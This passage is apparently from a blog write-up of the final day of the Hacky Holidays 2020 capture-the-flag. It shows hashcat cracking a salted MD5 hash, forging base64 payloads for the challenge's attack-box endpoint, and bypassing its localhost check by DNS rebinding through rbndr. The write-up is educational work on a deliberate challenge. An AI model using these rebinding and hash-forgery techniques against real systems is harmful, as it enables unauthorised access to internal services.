So nothing else of interest here. Looking at the information we got, we can say that for each IP, there is a `hash` generated. So If we want to attack an IP of our choice (localhost, as we need to bring down grich's network!), we need to generate the valid hash for that IP.

But how?

## Hunting the flag

1. As I encountered something similar in previous challenge too, i tried to check the `launch?payload=` endpoint for SQLi, but could not succeed. I then tried to crack the hashes, but failed again. Quite confused as there were much there to tinker with.
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-5.png)

2. Hackerone tweeted the above hint. Looking at it, it was quite straight forward as what I was missing. So a **"hash with salt!"**
3. Having very limited knowledge about hashes, i simply searched about salted hashes (md5 in this case), how they work and how I can crack them. This is what I understood:
   * A salt is a value that is added to user's password (can be something else, just depends on context) to make it unique, and then apply some hashing algorithm.
   * To crack the salt hash, I need to know the password.
4. I have the salt in hashed form, but where is the password. Was quite stuck here but a good friend pointed me to the right direction. But later I also found something which for me makes sense and we can use that information to at least guess what the password can be.
   
   * If we look  at the first image in our **information gathering** phase, the target is in form of **"RANDOM_HASH.`target`"**. Maybe the password for every hash is the `target` object value it self? (I don't know if it was intended but this is what i thought, i think this makes a little sense, at least to me).

5. So in a text file, I stored the values in this format: **`HASH:TARGET-IP`** as `HASH` is salt and `TARGET-IP` is our password.
6. Then using hashcat i was able to find the value.
   ```bash
    hashcat -a 3 -m 20 crack.txt --show
   ```

   `-a 3 for bruteforce attack, and -m 20 to select mode in (salt:pass) format`

   ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-6.png)

   So the salt value is **`mrgrinch463`**.

7. So we have `Salt` value, Now we know how the hash is being generated for the `target`. To generate hash for any target, we need to append the target value with the `SALT` value, as like **`mrgrinch463127.0.0.1`**.
8. Then convert that to md5 hash using any online site like https://www.md5hashgenerator.com/

    ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-7.png)

9. Then simply replace the `target` and `hash` objects with approriate values and encode it back to base64. 
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-8.png)
   
   Use that encoded value as the value for `payload` parameter: 
   ```
   https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
   ```
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-9.png)

   Whoops! The attack failed as there is some sort of protection. It is detecting the local address and aborting the attack against this. So we need to think about some bypass.

10. Well here I tried every possible bypass that I know, or can find on the internet but nothing really worked (or maybe I have not tried all the ways to bypass this protection yet).

   If we look at the above image, we can see that the IP address is being resolved two times.
   * First __before__ starting the botnets
   * Then __after__ starting the botnets
    
So what will happen if at first attempt, our IP is not of localhost (so attack will continue), but before reaching the second part, the IP gets changed to localhost.

   This is actually a known attack vector called DNS Rebinding.
   > DNS rebinding is a method of manipulating resolution of domain names that is commonly used as a form of computer attack. In this attack, a malicious web page causes visitors to run a client-side script that attacks machines elsewhere on the network.
   
   I used this amazing [BLOG](https://danielmiessler.com/blog/dns-rebinding-explained/) to get a basic idea of how this attack works. Performing this attack manually would have been difficult for me, but thanks to a friend, he suggested this tool called [RBNDR](https://github.com/taviso/rbndr) 

11. Simply I went to https://lock.cmpxchg8b.com/rebinder.html, Enterd two IP addresses, one the localhost, and the second can be any random IP address. This will generate a domain, which basically works just as we described above (switch between 127.0.0.1 and second IP randomly).
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-10.png)

12. Now we can follow the same steps, using the **`mrgrinch463`** as salt and IP address (in this case it is **`7f000001.c0a80001.rbndr.us`**), I converted this value into md5 hash.
    
    ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-11.png)

13. Now converted the following into base64 encoded data:
   
    ```
    {"target":"7f000001.c0a80001.rbndr.us", "hash":"de9d82d4ae9a61660701e7e1844ea643"}
    ```

    ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-12.png)


14. Put that base64 encoded payload in the `/launch?payload=` endpoint as:
   
    ```
        https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsICJoYXNoIjoiZGU5ZDgyZDRhZTlhNjE2NjA3MDFlN2UxODQ0ZWE2NDMifQ==
    ```

    ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-13.png)

    Note that we did not get what we wanted at first, this is because the switching of IPs is quite random, So I had to visit the above url for 4-5 times to get it to work.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-14.png)

Finally! The collective efforts of so many enthusiastic people saved the holidays. The Grinch Network is no more!

![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-15.png)

___

Thats all folks! I hope you guys enjoyed the writeup and learnt something new today. Kudos to [Adam Langley](https://twitter.com/adamtlangley) for creating amazing challenges for us!

 If you have any questions, feel free to drop a DM on __[Twitter](https://twitter.com/theFawsec)__

__Thanks!__
